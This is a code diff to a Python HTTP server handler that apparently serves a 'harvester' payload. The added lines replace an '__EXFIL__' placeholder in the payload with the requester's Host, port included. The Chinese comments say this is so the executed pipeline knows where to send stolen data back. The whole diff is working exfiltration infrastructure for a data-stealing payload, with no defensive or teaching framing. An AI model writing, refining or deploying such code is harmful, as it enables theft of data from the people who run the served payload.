@@ -42,6 +42,13 @@ class Handler(http.server.BaseHTTPRequestHandler):
         except Exception as e:
             self.send_error(500, "harvester missing: %s" % e)
             return
+
+        # 把占位符换成请求方实际用的地址，这样管道执行时也 know 往哪回传
+        # 保留完整 Host（含端口）—— 剥掉端口会导致回传打到 :80
+        host = self.headers.get("Host", "").strip()
+        if not host:
+            host = "%s:%d" % self.server.server_address[:2]
+        body = body.replace(b"__EXFIL__", host.encode("utf-8"))
         self.send_response(200)
         self.send_header("Content-Type", "text/plain; charset=utf-8")
         self.send_header("Content-Length", str(len(body)))
